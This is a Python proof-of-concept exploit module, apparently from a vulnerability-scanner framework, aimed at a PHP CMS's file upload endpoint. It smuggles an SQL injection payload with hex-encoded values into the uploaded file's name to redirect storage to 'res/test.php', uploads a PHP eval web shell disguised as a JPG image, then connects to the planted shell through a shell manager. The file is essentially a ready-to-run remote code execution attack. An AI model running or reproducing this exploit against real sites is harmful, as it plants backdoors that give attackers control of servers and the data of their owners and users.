import re

import requests

from lib.core.data import target


def poc(url):
    try:
        url_check(url, "index.php")

        phpsession = requests.get(target.url).cookies['PHPSESSION']
        cookies = {'PHPSESSION': phpsession}
        shell_password = raw_input("[*] Please enter the shell-password:")
        shell_content = "<?php eval($_POST['" + shell_password + "']);?>"
        # shell_content = "<?php phpinfo(); ?>"
        url1 = url + "?c=upload&f=save"
        files1 = [
            ('upfile',
             ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f746573742e706870,'1495536080','2.jpg",
              shell_content, 'image/jpg')),
        ]
        r = requests.post(url1, files=files1, cookies=cookies)
        response = r.text
        id = re.search('"id":"(\d+)"', response, re.S).group(1)
        id = int(id) + 1

        url2 = url + '?c=upload&f=replace&oldid=%d' % id
        files2 = [
            ('upfile', ('1.jpg', shell_content, 'image/jpg')),
        ]
        r = requests.post(url2, files=files2, cookies=cookies)

        header = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
            'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':
            'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding':
            'gzip, deflate',
        }

        shell_path = url.replace("/index.php", "/res/test.php")
        shell_manage = shell(header, shell_path, shell_password)
        shell_manage.check()
        shell_manage.post_manage()

    except Exception:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
